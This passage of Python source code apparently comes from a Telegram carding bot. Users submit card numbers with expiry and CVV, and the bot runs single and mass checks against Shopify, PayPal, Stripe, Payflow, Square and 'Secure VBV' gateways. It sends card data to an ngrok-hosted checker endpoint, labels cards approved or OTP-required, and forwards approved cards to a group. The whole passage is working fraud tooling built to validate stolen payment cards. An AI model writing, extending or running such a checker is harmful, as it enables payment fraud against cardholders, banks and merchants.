        formatted_cc = f"{cc_num}|{mm}|{yy}|{cvv}"

        # Get BIN info
        brand = country_name = card_type = bank = 'UNKNOWN'
        country_flag = '🇺🇳'
        try:
            bin_data = requests.get(f"https://bins.antipublic.cc/bins/{cc_num[:6]}", timeout=5).json()
            brand = bin_data.get('brand', 'UNKNOWN')
            country_name = bin_data.get('country_name', 'UNKNOWN')
            country_flag = bin_data.get('country_flag', '🇺🇳')
            card_type = bin_data.get('type', 'UNKNOWN')
            bank = bin_data.get('bank', 'UNKNOWN')
        except:
            pass

        # Make API request
        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={formatted_cc}&site={site_info['url']}"
        response = requests.get(api_url, timeout=100)
        
        if response.status_code != 200:
            return {
                'status': 'ERROR',
                'card': formatted_cc,
                'message': f'API Error: {response.status_code}',
                'brand': brand,
                'country': f"{country_name} {country_flag}",
                'type': card_type,
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        # Parse response text
        response_text = response.text
        
        # Default values
        api_message = 'No response'
        price = site_info.get('price', '1.0')
        gateway = 'shopify_payments'
        status = 'DECLINED'
        
        # Extract data from response text
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
                
                # Process response according to new rules
                response_upper = api_message.upper()
                if 'THANK YOU' in response_upper:
                    bot_response = 'ORDER CONFIRM!'
                    status = 'APPROVED'
                elif '3DS' in response_upper:
                    bot_response = 'OTP_REQUIRED'
                    status = 'APPROVED_OTP'
                elif 'EXPIRED_CARD' in response_upper:
                    bot_response = 'EXPIRE_CARD'
                    status = 'EXPIRED'
                elif any(x in response_upper for x in ['INSUFFICIENT_FUNDS', 'INCORRECT_CVC', 'INCORRECT_ZIP']):
                    bot_response = api_message
                    status = 'APPROVED_OTP'
                else:
                    bot_response = api_message
                    status = 'DECLINED'
            else:
                bot_response = api_message
                
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except Exception as e:
            bot_response = f"Error parsing response: {str(e)}"
        
        return {
            'status': status,
            'card': formatted_cc,
            'message': bot_response,
            'brand': brand,
            'country': f"{country_name} {country_flag}",
            'type': card_type,
            'gateway': f"Self Shopify [${price}]",
            'price': price
        }
            
    except Exception as e:
        return {
            'status': 'ERROR',
            'card': cc,
            'message': f'Exception: {str(e)}',
            'brand': 'UNKNOWN',
            'country': 'UNKNOWN 🇺🇳',
            'type': 'UNKNOWN',
            'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
            'price': site_info.get('price', '1.0')
        }

def format_shopify_response(result, user_full_name, processing_time):
    user_id_str = str(result.get('user_id', ''))
    
    # Determine user status
    if user_id_str == "7820713047":
        user_status = "Owner"
    elif int(user_id_str) in ADMIN_IDS:
        user_status = "Admin"
    else:
        user_status = "Free"

    response = f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ {status_text[result['status']]} {status_emoji[result['status']]}</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝗖𝗮𝗿𝗱
   ↳ <code>{result['card']}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>{result['gateway']}</i>  
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>{result['message']}</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {result['brand']}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐚𝐧𝐤 ⌁ {result['type']}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {result['country']}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐪 𝐁𝐲 ⌁ {user_full_name}[{user_status}]
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐃𝐞𝐯 ⌁ <a href='tg://user?id=6521162324'>⎯꯭𖣐᪵‌𐎓⏤‌‌𝐃𝐚𝐫𝐤𝐛𝐨𝐲◄⏤‌‌ꭙ‌‌⁷ ꯭</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝗧𝗶𝗺𝗲 ⌁  {processing_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝
"""
    return response

@bot.message_handler(commands=['sh'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sh'))
def handle_sh(message):
    user_id = str(message.from_user.id)
    
    # Check if user has set a URL first
    if user_id not in USER_SITES:
        bot.reply_to(message, "❌ You haven't added any site yet. Add a site with /seturl <your_shopify_url>\nUse /myurl to view your site details")
        return
    
    # Check credits
    if not use_credits(int(user_id)):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    try:
        # Extract card from either format
        cc = None
        
        # Check if command is empty (either '/sh' or '.sh' without arguments)
        if (message.text.startswith('/sh') and len(message.text.split()) == 1) or \
           (message.text.startswith('.sh') and len(message.text.strip()) == 3):
            
            # Check if this is a reply to another message
            if message.reply_to_message:
                # Search for CC in replied message text
                replied_text = message.reply_to_message.text
                # Try to find CC in common formats
                cc_pattern = r'\b(?:\d[ -]*?){13,16}\b'
                matches = re.findall(cc_pattern, replied_text)
                if matches:
                    # Clean the CC (remove spaces and dashes)
                    cc = matches[0].replace(' ', '').replace('-', '')
                    # Check if we have full card details (number|mm|yyyy|cvv)
                    details_pattern = r'(\d+)[\|/](\d+)[\|/](\d+)[\|/](\d+)'
                    details_match = re.search(details_pattern, replied_text)
                    if details_match:
                        cc = f"{details_match.group(1)}|{details_match.group(2)}|{details_match.group(3)}|{details_match.group(4)}"
        else:
            # Normal processing for commands with arguments
            if message.text.startswith('/'):
                parts = message.text.split()
                if len(parts) < 2:
                    bot.reply_to(message, "❌ Invalid format. Use /sh CC|MM|YYYY|CVV or .sh CC|MM|YYYY|CVV")
                    return
                cc = parts[1]
            else:  # starts with .
                cc = message.text[4:].strip()  # remove ".sh "

        if not cc:
            bot.reply_to(message, "❌ No card found. Either provide CC details after command or reply to a message containing CC details.")
            return

        start_time = time.time()

        user_full_name = message.from_user.first_name
        if message.from_user.last_name:
            user_full_name += " " + message.from_user.last_name

        # Get bin info for the checking status message
        bin_number = cc.split('|')[0][:6]
        bin_info = get_bin_info(bin_number) or {}
        brand = bin_info.get('brand', 'UNKNOWN')
        card_type = bin_info.get('type', 'UNKNOWN')
        country = bin_info.get('country', 'UNKNOWN')
        country_flag = bin_info.get('country_flag', '🇺🇳')

        status_msg = bot.reply_to(
            message,
            f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ ↯ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>

<a href='https://t.me/stormxvup'>[⸙]</a> 𝗖𝗮𝗿𝗱 ⌁ <code>{cc}</code>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ⌁ <i>Self Shopify [${USER_SITES[user_id].get('price', '1.0')}]</i>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ⌁ <i>Processing</i>
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐁𝐫𝐚𝐧𝐝 ⌁ {brand}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐓𝐲𝐩𝐞 ⌁ {card_type}
<a href='https://t.me/stormxvup'>[⸙]</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⌁ {country} {country_flag}
<a href='https://t.me/stormxvup'>──────── ⸙ ─────────</a>
            """,
            parse_mode='HTML'
        )

        def check_card():
            try:
                result = check_shopify_cc(cc, USER_SITES[user_id])
                result['user_id'] = message.from_user.id
                processing_time = time.time() - start_time
                response_text = format_shopify_response(result, user_full_name, processing_time)

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=response_text,
                    parse_mode='HTML'
                )

            except Exception as e:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_msg.message_id,
                    text=f"❌ An error occurred: {str(e)}"
                )

        threading.Thread(target=check_card).start()

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# --------------------
# SINGLE PAYPAL CHECK
# --------------------
@bot.message_handler(commands=['pp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pp'))
def handle_pp(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_info = get_bin_info(cc.split('|')[0][:6]) or {}

    status_message = bot.reply_to(message, checking_status_format(cc, "PayPal [2$]", bin_info), parse_mode='HTML')
    start_time = time.time()
    check_result = process_card_pp(cc)
    time_taken = round(time.time() - start_time, 2)

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=single_check_format(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            mention=mention,
            Userstatus=user_status,
            bin_info=bin_info,
            time_taken=time_taken,
            status=check_result["status"]
        ),
        parse_mode='HTML'
    )

# --------------------
# MASS PAYPAL CHECK
# --------------------
@bot.message_handler(commands=['mpp'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpp'))
def handle_mpp(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    cards_text = message.text.split()[1:] if len(message.text.split()) > 1 else None
    if not cards_text and message.reply_to_message:
        cards_text = message.reply_to_message.text
    elif not cards_text:
        bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
        return

    cards = [c.strip() for line in cards_text for c in line.split() if '|' in c]
    if not cards:
        bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
        return

    if len(cards) > MAX_MASS_CHECK:
        cards = cards[:MAX_MASS_CHECK]
        bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

    if not use_credits(user_id, len(cards)):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    gateway = "PayPal [2$]"
    status_message = bot.reply_to(message, f"🚀 Starting mass PayPal check of {len(cards)} cards...")
    start_time = time.time()
    bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                          text=format_mass_check_processing(len(cards), 0, gateway), parse_mode='HTML')

    def process_cards():
        results = []
        for i, card in enumerate(cards, 1):
            try:
                result = process_card_pp(card)
                results.append({'card': card, 'status': result['status'], 'response': result['response'], 'gateway': result.get('gateway', gateway)})

                if result["status"].upper() == "APPROVED":
                    send_to_group(
                        cc=card,
                        gateway=result["gateway"],
                        response=result["response"],
                        bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                        time_taken=round(time.time() - start_time, 2),
                        user_info=message.from_user
                    )
            except Exception as e:
                results.append({'card': card, 'status': 'ERROR', 'response': f'Error: {str(e)}', 'gateway': gateway})

            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=format_mass_check(results, len(cards), time.time()-start_time, gateway, i),
                                  parse_mode='HTML')

        bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                              text=format_mass_check(results, len(cards), time.time()-start_time, gateway, len(cards)),
                              parse_mode='HTML')

    threading.Thread(target=process_cards).start()

# --------------------
# SINGLE SECURE VBV CHECK
# --------------------
@bot.message_handler(commands=['svb'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.svb'))
def handle_svb(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_info = get_bin_info(cc.split('|')[0][:6]) or {}

    status_message = bot.reply_to(message, checking_status_format(cc, "Secure VBV", bin_info), parse_mode='HTML')
    start_time = time.time()
    check_result = process_card_svb(cc)
    time_taken = round(time.time() - start_time, 2)
    formatted_response = check_result["response"].lower().capitalize()

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=formatted_response,
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                          text=single_check_format(cc, check_result["gateway"], formatted_response, mention,
                                                   user_status, bin_info, time_taken, check_result["status"]),
                          parse_mode='HTML')

@bot.message_handler(commands=['msvb'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msvb'))
def handle_msvb(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    cards_text = message.text.split()[1:] if len(message.text.split()) > 1 else None
    if not cards_text and message.reply_to_message:
        cards_text = message.reply_to_message.text
    elif not cards_text:
        bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
        return

    cards = [c.strip() for line in cards_text for c in line.split() if '|' in c]
    if not cards:
        bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
        return

    if len(cards) > MAX_MASS_CHECK:
        cards = cards[:MAX_MASS_CHECK]
        bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

    if not use_credits(user_id, len(cards)):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    gateway = "Secure VBV"
    status_message = bot.reply_to(message, f"🚀 Starting mass Secure VBV check of {len(cards)} cards...")
    start_time = time.time()
    bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                          text=format_mass_check_processing(len(cards), 0, gateway), parse_mode='HTML')

    def process_cards():
        results = []
        for i, card in enumerate(cards, 1):
            try:
                result = process_card_svb(card)
                formatted_response = result["response"].lower().capitalize()
                results.append({'card': card, 'status': result['status'], 'response': formatted_response, 'gateway': result.get('gateway', gateway)})

                if result["status"].upper() == "APPROVED":
                    send_to_group(
                        cc=card,
                        gateway=result["gateway"],
                        response=formatted_response,
                        bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                        time_taken=round(time.time() - start_time, 2),
                        user_info=message.from_user
                    )

            except Exception as e:
                results.append({'card': card, 'status': 'ERROR', 'response': f'Error: {str(e)}', 'gateway': gateway})

            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=format_mass_check(results, len(cards), time.time()-start_time, gateway, i),
                                  parse_mode='HTML')

        bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                              text=format_mass_check(results, len(cards), time.time()-start_time, gateway, len(cards)),
                              parse_mode='HTML')

    threading.Thread(target=process_cards).start()

# Handle /sr command
@bot.message_handler(commands=['sr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sr'))
def handle_sr(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Stripe Auth 3", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run SR check ---
    start_time = time.time()
    check_result = process_card_sr(cc)  # This calls the function from sr.py
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# Handle /msr command
@bot.message_handler(commands=['msr'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msr'))
def handle_msr(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # Extract cards
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Stripe Auth 3 check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Stripe Auth 3"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = process_card_sr(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /pf command
@bot.message_handler(commands=['pf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.pf'))
def handle_pf(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Payflow [0.98$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run PF check ---
    start_time = time.time()
    check_result = process_pf_card(cc)  # This calls the function from pf.py
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mpf command
@bot.message_handler(commands=['mpf'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpf'))
def handle_mpf(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # Extract cards
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Payflow [0.98$] check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Payflow [0.98$]"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = process_pf_card(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /sq command
@bot.message_handler(commands=['sq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.sq'))
def handle_sq(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Square Auth", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run SQ check ---
    start_time = time.time()
    check_result = process_sq_card(cc)  # This calls the function from sq.py
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"].upper() in ["APPROVED", "APPROVED_OTP"]:
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /msq command
@bot.message_handler(commands=['msq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.msq'))
def handle_msq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # Extract cards
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

